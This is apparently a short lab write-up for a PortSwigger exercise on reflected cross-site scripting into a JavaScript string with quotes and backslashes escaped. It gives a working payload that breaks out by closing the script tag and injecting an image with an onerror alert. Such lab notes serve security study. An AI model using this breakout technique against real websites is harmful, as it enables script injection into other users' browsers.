This lab contains a [reflected cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/reflected) vulnerability in the search query tracking functionality. The reflection occurs inside a JavaScript string with single quotes and backslashes escaped.

To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the `alert` function.

# Vuln assessment

Locate the reflection point

![[Client-Side Vulnerabilities/XSS/Reflected XSS/labs/Reflected XSS into a JavaScript string with single quote and backslash escaped/images/reflection-point.png]]

Try to close the `<script>` tag:

# Exploitation

This payload will exploit the xss vuln within the JavaScript context:

```html
test'</script><img src=1 onerror=alert(1)>
```
